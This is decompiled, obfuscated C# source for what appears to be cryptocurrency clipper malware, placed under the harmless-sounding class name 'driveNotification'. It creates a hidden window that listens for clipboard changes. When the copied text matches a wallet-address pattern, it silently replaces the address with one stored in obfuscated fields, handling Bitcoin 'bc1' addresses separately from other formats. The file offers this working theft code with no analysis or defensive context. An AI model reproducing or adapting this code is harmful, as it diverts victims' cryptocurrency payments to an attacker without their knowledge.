using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace ConsoleApplication7;

public sealed class driveNotification
{
	public class NotificationForm : Form
	{
		[CompilerGenerated]
		private sealed class a
		{
			public string a;

			public void b()
			{
				a = Clipboard.GetText();
			}
		}

		[CompilerGenerated]
		private sealed class b
		{
			public string a;

			public void b()
			{
				Clipboard.SetText(a);
			}
		}

		private static string m_a = GetText();

		protected override CreateParams CreateParams
		{
			get
			{
				CreateParams createParams = ((Form)this).CreateParams;
				createParams.ExStyle |= 0x80;
				return createParams;
			}
		}

		public NotificationForm()
		{
			global::a.a.SetParent(((Control)this).Handle, global::a.a.b);
			global::a.a.AddClipboardFormatListener(((Control)this).Handle);
		}

		private bool a(Regex A_0)
		{
			if (A_0.Match(NotificationForm.m_a).Success)
			{
				return true;
			}
			return false;
		}

		protected override void WndProc(ref Message m)
		{
			if (((Message)(ref m)).Msg == 797)
			{
				NotificationForm.m_a = GetText();
				if (NotificationForm.m_a.StartsWith("bc1"))
				{
					if (a(global::a.ab) && !NotificationForm.m_a.Contains(global::a.aa))
					{
						string text = global::a.ab.Replace(NotificationForm.m_a, global::a.aa);
						SetText(text);
					}
				}
				else if (a(global::a.ab) && !NotificationForm.m_a.Contains(global::a.y))
				{
					string text2 = global::a.ab.Replace(NotificationForm.m_a, global::a.y);
					SetText(text2);
				}
			}
			((Form)this).WndProc(ref m);
		}

		public static string GetText()
		{
			string a = string.Empty;
			Thread thread = new Thread((ThreadStart)delegate
			{
				a = Clipboard.GetText();
			});
			thread.SetApartmentState(ApartmentState.STA);
			thread.Start();
			thread.Join();
			return a;
		}

		public static void SetText(string txt)
		{
			Thread thread = new Thread((ThreadStart)delegate
			{
				Clipboard.SetText(txt);
			});
			thread.SetApartmentState(ApartmentState.STA);
			thread.Start();
			thread.Join();
		}
	}
}
